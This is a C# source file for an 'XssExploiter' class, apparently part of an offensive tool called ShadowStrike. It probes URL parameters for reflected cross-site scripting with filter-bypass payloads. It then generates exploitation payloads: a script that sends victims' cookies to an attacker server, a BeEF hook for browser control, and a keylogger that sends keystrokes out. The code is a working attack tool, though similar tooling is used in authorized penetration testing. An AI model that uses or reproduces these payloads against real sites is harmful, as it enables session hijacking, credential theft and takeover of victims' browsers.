using System;
using System.Collections.Generic;
using System.Net.Http;
using System.Threading.Tasks;
using System.Text.RegularExpressions;
using System.Linq;

namespace ShadowStrike.Core
{
    public class XssExploiter
    {
        private HttpClient _client;
        private Random _random;

        public XssExploiter()
        {
            var handler = new HttpClientHandler
            {
                UseCookies = true,
                AllowAutoRedirect = true,
                AutomaticDecompression = System.Net.DecompressionMethods.GZip | System.Net.DecompressionMethods.Deflate
            };
            _client = new HttpClient(handler);
            _client.Timeout = TimeSpan.FromSeconds(10);
            _client.DefaultRequestHeaders.UserAgent.ParseAdd("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36");
            _random = new Random();
        }

        public class XssTestResult
        {
            public string TestName { get; set; }
            public string Payload { get; set; }
            public bool Vulnerable { get; set; }
            public string Details { get; set; }
            public string Severity { get; set; }
        }

        // Phase 1: Reconnaissance & Target Identification
        public async Task<List<XssTestResult>> ScanForXssAsync(string url, string parameter)
        {
            var results = new List<XssTestResult>();
            
            // 1. Basic Reflection Test
            var basicPayload = "ShadowStrikeXSS";
            if (await TestReflection(url, parameter, basicPayload))
            {
                results.Add(new XssTestResult
                {
                    TestName = "Input Reflection",
                    Payload = basicPayload,
                    Vulnerable = true,
                    Details = "Input is reflected in the response. Potential XSS vector.",
                    Severity = "LOW"
                });

                // 2. Fingerprint Sanitization
                results.AddRange(await FingerprintSanitization(url, parameter));
            }
            else
            {
                results.Add(new XssTestResult
                {
                    TestName = "Input Reflection",
                    Payload = basicPayload,
                    Vulnerable = false,
                    Details = "Input was not found in the response.",
                    Severity = "NONE"
                });
            }

            return results;
        }

        private async Task<bool> TestReflection(string url, string parameter, string payload)
        {
            try
            {
                var testUrl = $"{url}?{parameter}={Uri.EscapeDataString(payload)}";
                var response = await _client.GetStringAsync(testUrl);
                return response.Contains(payload);
            }
            catch
            {
                return false;
            }
        }

        private async Task<List<XssTestResult>> FingerprintSanitization(string url, string parameter)
        {
            var results = new List<XssTestResult>();
            var probes = new Dictionary<string, string>
            {
                { "Standard Script", "<script>alert(1)</script>" },
                { "Image OnError", "<img src=x onerror=alert(1)>" },
                { "SVG OnLoad", "<svg/onload=alert(1)>" },
                { "Case Sensitivity", "<ScRiPt>alert(1)</sCrIpT>" },
                { "Tag Splitting", "<scr<script>ipt>alert(1)</script>" }
            };

            foreach (var probe in probes)
            {
                try
                {
                    var testUrl = $"{url}?{parameter}={Uri.EscapeDataString(probe.Value)}";
                    var response = await _client.GetStringAsync(testUrl);

                    if (response.Contains(probe.Value))
                    {
                        results.Add(new XssTestResult
                        {
                            TestName = $"Sanitization Check: {probe.Key}",
                            Payload = probe.Value,
                            Vulnerable = true,
                            Details = "Payload reflected verbatim. No sanitization detected.",
                            Severity = "HIGH"
                        });
                    }
                    else
                    {
                        // Check for partial reflection (sanitization)
                        // e.g., <script> removed but alert(1) remains
                        if (response.Contains("alert(1)"))
                        {
                            results.Add(new XssTestResult
                            {
                                TestName = $"Sanitization Check: {probe.Key}",
                                Payload = probe.Value,
                                Vulnerable = false,
                                Details = "Tags stripped but content remains. Filter detected.",
                                Severity = "MEDIUM"
                            });
                        }
                    }
                }
                catch { }
            }

            return results;
        }

        // Phase 2: Weaponization (Crafting the Exploit)
        public async Task<List<XssTestResult>> DeployPayloadsAsync(string url, string parameter, string beefHookUrl = "", string attackerServerUrl = "")
        {
            var results = new List<XssTestResult>();

            // 1. Session Stealing Payload
            if (!string.IsNullOrEmpty(attackerServerUrl))
            {
                var cookieStealer = $"<script>new Image().src='{attackerServerUrl}/steal?c='+encodeURIComponent(document.cookie)</script>";
                results.Add(new XssTestResult
                {
                    TestName = "Session Stealing Payload",
                    Payload = cookieStealer,
                    Vulnerable = true, // We assume vulnerability if we are at this stage
                    Details = "Injects a script to send document.cookie to attacker server.",
                    Severity = "CRITICAL"
                });
            }

            // 2. BeEF Hook
            if (!string.IsNullOrEmpty(beefHookUrl))
            {
                var beefPayload = $"<script src=\"{beefHookUrl}\"></script>";
                results.Add(new XssTestResult
                {
                    TestName = "BeEF Hook Injection",
                    Payload = beefPayload,
                    Vulnerable = true,
                    Details = "Injects BeEF hook for browser control.",
                    Severity = "CRITICAL"
                });
            }

            // 3. Keylogger (Simulation)
            var keylogger = "<script>document.onkeypress=function(e){new Image().src='" + attackerServerUrl + "/log?k='+e.key}</script>";
            results.Add(new XssTestResult
            {
                TestName = "Keylogger Injection",
                Payload = keylogger,
                Vulnerable = true,
                Details = "Injects a keystroke logger.",
                Severity = "CRITICAL"
            });

            return await Task.FromResult(results);
        }
    }
}
